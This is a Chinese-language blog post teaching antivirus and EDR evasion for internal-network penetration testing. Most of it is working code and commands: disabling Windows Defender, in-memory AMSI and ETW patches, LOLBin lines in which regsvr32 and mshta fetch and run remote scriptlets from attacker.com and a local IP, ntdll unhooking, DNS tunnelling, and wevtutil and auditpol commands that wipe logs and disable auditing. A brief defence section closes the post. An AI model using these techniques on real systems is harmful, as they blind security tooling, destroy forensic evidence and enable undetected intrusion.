---
title: 内网渗透中的免杀与防御规避
date: 2025-12-05 08:00:00
tags:
  - 内网渗透
  - 渗透测试
categories: 渗透测试
---

## 前言

在内网渗透中，攻击者获取初始访问权限后面临的首要挑战是如何在目标环境中驻留并横向移动而不被检测。随着端点检测与响应（EDR）、反恶意软件扫描接口（AMSI）以及事件跟踪（ETW）等防御机制的普及，传统攻击工具往往在落地瞬间就会被查杀。本文系统梳理内网渗透中常用的免杀与防御规避技术，帮助安全从业人员理解攻防对抗原理，从而更好地构建防御体系。

**免责声明：本文所述技术仅供安全研究、授权渗透测试及防御建设参考，严禁用于任何非法用途。使用者需自行承担一切法律后果。**

---

## 一、Windows Defender 绕过方法

### 1.1 添加排除路径与注册表禁用

Windows Defender 允许通过 PowerShell 和注册表添加扫描排除项。攻击者若已获得管理员权限，可直接将工作目录或特定扩展名加入排除列表：

```powershell
# 添加排除路径、进程与扩展名
Add-MpPreference -ExclusionPath "C:\Users\Public\Documents"
Add-MpPreference -ExclusionProcess "mimikatz.exe"
Add-MpPreference -ExclusionExtension ".enc"

# 查看当前排除配置
Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess, ExclusionExtension
```

在具备 SYSTEM 或 TrustedInstaller 权限时，可通过注册表彻底禁用 Defender：

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

### 1.2 Token 窃取与权限操纵

当无法直接禁用 Defender 时，可利用 `AdjustTokenPrivileges` 启用 `SeDebugPrivilege`，以高完整性级别运行进程绕过用户态检测。

---

## 二、AMSI 绕过技术

AMSI（Antimalware Scan Interface）是微软提供的反恶意软件扫描接口。PowerShell、VBA、.NET 等在运行时通过 AMSI 传递脚本内容，使得免杀极为困难。

### 2.1 内存修补 AmsiScanBuffer

经典手法：在 PowerShell 进程中定位 `AmsiScanBuffer` 函数并修改其汇编指令使其直接返回 `AMSI_RESULT_CLEAN`：

```csharp
public class AmsiBypass
{
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32.dll")] static extern bool VirtualProtect(
        IntPtr a, uint s, uint p, out uint o);

    public static void Patch()
    {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr ptr = GetProcAddress(lib, "AmsiScanBuffer");
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax,0x80070057; ret
        uint old;
        VirtualProtect(ptr, (uint)patch.Length, 0x40, out old);
        Marshal.Copy(patch, 0, ptr, patch.Length);
        VirtualProtect(ptr, (uint)patch.Length, old, out old);
    }
}
```

### 2.2 amsiInitFailed 与反射加载

```powershell
# 反射设置 amsiInitFailed 标志
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 反射加载 .NET 程序集（避免磁盘写入）
$bytes = [System.IO.File]::ReadAllBytes("payload.dll")
$asm = [System.Reflection.Assembly]::Load($bytes)
$asm.EntryPoint.Invoke($null, @(, [string[]]@()))
```

---

## 三、ETW 禁用技术

Event Tracing for Windows 是 Windows 内置的事件跟踪机制，EDR 大量依赖 ETW 提供者获取进程创建、网络连接等遥测数据。

### 3.1 修补 EtwEventWrite

```c
void DisableETW()
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC etw = GetProcAddress(ntdll, "EtwEventWrite");
    DWORD old;
    VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)etw = 0xC3;  // ret
    VirtualProtect(etw, 1, old, &old);
}
```

### 3.2 logman 与 .NET 环境绕过

```cmd
:: 关闭 Microsoft-Windows-Threat-Intelligence 提供者
logman stop "ThreatIntelligence" -ets
:: 关闭 DNS 客户端事件
logman stop "Microsoft-Windows-DNS-Client" -ets
:: 关闭 PowerShell 日志提供者
logman stop "Microsoft-Windows-PowerShell" -ets
```

```powershell
# .NET 环境阻止 CLR 生成 ETW 事件
[Environment]::SetEnvironmentVariable("COMPlus_ETWEnabled", "0", "Process")
```

---

## 四、AppLocker 绕过与 DLL 劫持

AppLocker 是 Windows 应用程序白名单功能。绕过核心思路是利用受信任的签名二进制文件代理执行恶意代码。

### 4.1 签名二进制代理执行（LOLBin）

```
# regsvr32 远程脚本执行
regsvr32.exe /s /n /u /i:http://192.168.1.100/payload.sct scrobj.dll

# mshta 执行 JavaScript
mshta.exe javascript:a=GetObject("script:http://attacker.com/evil.sct");a.Exec();

# rundll32 加载恶意 DLL
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";alert(1)

# InstallUtil 执行 .NET 装配件
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /U payload.dll

# MSBuild 内联 C# 执行
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe evil.csproj

# csc.exe 编译执行
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:payload.exe payload.cs
```

### 4.2 DLL 劫持与 COM 对象绕过

DLL 劫持利用 Windows DLL 搜索顺序，将恶意 DLL 放置在合法程序搜索路径中。DLL 不受 AppLocker 默认规则限制。常见劫持目标包括应用程序安装目录中缺失的 DLL、路径重定向漏洞等。

```cpp
// 代理 DLL 模板
#pragma comment(linker, "/EXPORT:OriginalFunc=legitimate.OriginalFunc,@1")
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID v) {
    if (r == DLL_PROCESS_ATTACH) WinExec("calc.exe", SW_SHOW);
    return TRUE;
}
```

利用 COM 对象绕过 AppLocker：

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
$com.ShellExecute("cmd.exe", "/c whoami", "", "open", 0)
```

---

## 五、EDR 规避核心原理

现代 EDR 在内核态注册回调（PsSetCreateProcessNotifyRoutine、ObRegisterCallbacks 等），并结合用户态 hook 实现行为监控。

### 5.1 用户态 Hook 解除

多数 EDR 在 `ntdll.dll` 函数入口植入 `jmp` 跳转拦截系统调用。可从磁盘重新映射干净的 ntdll.dll 副本：

```cpp
HANDLE hFile = CreateFileW(L"\\??\\C:\\Windows\\System32\\ntdll.dll",
    GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hSection;
NtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE,
    NULL, NULL, PAGE_EXECUTE, SEC_IMAGE, hFile);
PVOID pNtdll = NULL;
NtMapViewOfSection(hSection, GetCurrentProcess(), &pNtdll, 0, 0, NULL,
    &viewSize, ViewShare, 0, PAGE_EXECUTE);
// 通过新映射的 ntdll 获取未被 hook 的函数地址执行系统调用
```

### 5.2 直接系统调用（Direct Syscall）

绕过 ntdll.dll hook 层，直接从汇编执行 `syscall` 指令。需动态解析系统调用号（SSN），因为不同 Windows 版本号不同：

```c
DWORD ssn = GetSyscallNumber("NtOpenProcess");  // 从磁盘 ntdll.dll 读取
__asm {
    mov r10, rcx
    mov eax, ssn
    syscall
    ret
}
```

### 5.3 进程注入与内核回调解除

利用合法 Windows 进程作为宿主：进程镂空（Process Hollowing）创建挂起进程替换载荷；进程分身（Process Doppelganging）利用 NTFS 事务不留磁盘痕迹；进程重影（Process Herpaderping）使扫描与执行基址偏差。内核级规避可遍历 `PspCreateProcessNotifyRoutine` 数组移除 EDR 回调，或从 `_OBJECT_HEADER` 中清除 `OB_FLAG_CALLBACK_ENABLED` 标记。

---

## 六、C2 通信隐藏技术

### 6.1 域前置（Domain Fronting）

域前置利用 CDN 架构：TLS SNI 头填充高信誉域名（如 `cdn.cloudflare.com`），HTTP Host 头填充真实 C2 域名。中间设备仅看到 SNI 而无法解密 HTTP 层，流量表现为与知名 CDN 的正常通信。需注意主流 CDN 近年已收紧域前置策略。

### 6.2 CDN 中继与隧道技术

- 在 Cloudflare 中配置 Worker 转发特定路径请求到真实 C2
- 使用 Nginx `mod_rewrite` 条件转发：仅对特定 User-Agent 或 Cookie 的请求转发后端
- 利用 GitHub Gist、Pastebin 等公开服务传输指令

在高度受限内网环境中，DNS 和 ICMP 往往是唯一出网通道：

```bash
# dnscat2 服务端
ruby dnscat2.rb --dns "domain=example.com" --secret=password
# 客户端
dnscat.exe --dns server=8.8.8.8,domain=example.com --secret=password
```

### 6.3 流量伪装与抖动策略

- **随机化 Beacon 间隔**：添加 30%-50% 的随机抖动，避免固定心跳
- **时间窗口控制**：仅在目标工作时间活跃，夜间休眠
- **流量伪装**：模仿浏览器正常访问，携带完整 Cookie、Referer、Accept-Language 头

---

## 七、日志清除技术

### 7.1 wevtutil 清除事件日志

```cmd
:: 列出所有日志
wevtutil el
:: 清除安全日志
wevtutil cl Security
:: 清除系统日志
wevtutil cl System
:: 清除应用程序日志
wevtutil cl Application
:: 清除 PowerShell 操作日志
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
:: 清除 Sysmon 日志
wevtutil cl "Microsoft-Windows-Sysmon/Operational"
```

### 7.2 单条日志过滤删除

更隐蔽的做法是仅删除与攻击操作相关的条目：

```powershell
$t = (Get-Date).AddHours(-2)
$events = Get-WinEvent -FilterHashtable @{
    LogName   = "Security"
    StartTime = $t
    ID        = @(4624, 4625, 4672, 4688)
} -MaxEvents 1000 -ErrorAction SilentlyContinue
$events | ForEach-Object {
    Write-Host "可疑: ID=$($_.Id) Record=$($_.RecordId) Time=$($_.TimeCreated)"
}
```

### 7.3 auditpol 禁用审计策略

```cmd
:: 查看当前审计策略
auditpol /get /category:*
:: 清除所有审计策略
auditpol /clear
:: 禁用进程创建审计（Event ID 4688）
auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable
:: 禁用登录审计
auditpol /set /subcategory:"Logon" /success:disable /failure:disable
:: 恢复审计策略
auditpol /restore /file:C:\Windows\System32\GroupPolicy\Machine\Microsoft\Windows NT\Audit\audit.csv
```

### 7.4 其他痕迹清理

```cmd
:: PSReadLine 历史
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
:: RDP 连接记录
reg delete "HKCU\Software\Microsoft\Terminal Server Client" /va /f
:: Prefetch 文件
del C:\Windows\Prefetch\*.pf /s /f /q
:: 最近文档
del /f /s /q %APPDATA%\Microsoft\Windows\Recent\*
```

---

## 八、纵深防御规避与建议

### 8.1 攻击链设计原则

- **最小化落地文件**：优先使用内存加载和 LOLBin，减少文件系统接触
- **分段执行**：将完整攻击链拆分为多个不敏感的独立步骤
- **环境感知**：执行前检测沙箱或 EDR 存在，动态调整行为
- **加密混淆**：对所有字符串、API 名称和网络流量进行加密

典型规避链路：

```
1. 钓鱼 VBA -> 内存混淆 Launcher
2. Launcher 释放 XOR 加密 .NET 装配件 -> 反射加载
3. 加载前修补 AMSI + ETW
4. 干净 ntdll 副本解析 syscall 号进程注入
5. C2 通信域前置 + 自定义编码协议
6. 横向移动优先 WinRM / DCOM
7. wevtutil + auditpol 清理日志
```

### 8.2 防御建议

企业防御方应构建纵深防御体系：

- **启用 Windows Defender ASR 规则**：阻止常见 LOLBin 子进程创建
- **强化 AMSI 完整性**：对关键 API 进行完整性校验，检测内存修补
- **ETW 完整性监控**：监控 `EtwEventWrite` 等关键函数修改
- **应用程序控制**：合理配置 AppLocker / WDAC，阻断非受信 DLL 加载
- **Sysmon + 集中式 SIEM**：收集关联端点日志，检测异常系统调用和日志清除
- **网络层检测**：监控非标准 DNS 流量、ICMP 异常包大小及 TLS SNI 与 Host 不一致

---

## 结语

免杀与防御规避是一场持续的军备竞赛。攻击者不断挖掘新的 LOLBin、AMSI 绕过向量和更隐蔽的 C2 通道，防御方则通过内核传感器、行为分析和机器学习不断提升检测能力。理解攻击者思维模式和技术细节，是构建有效防御体系的前提。本文仅作技术参考，读者应在合法合规前提下学习和实践。
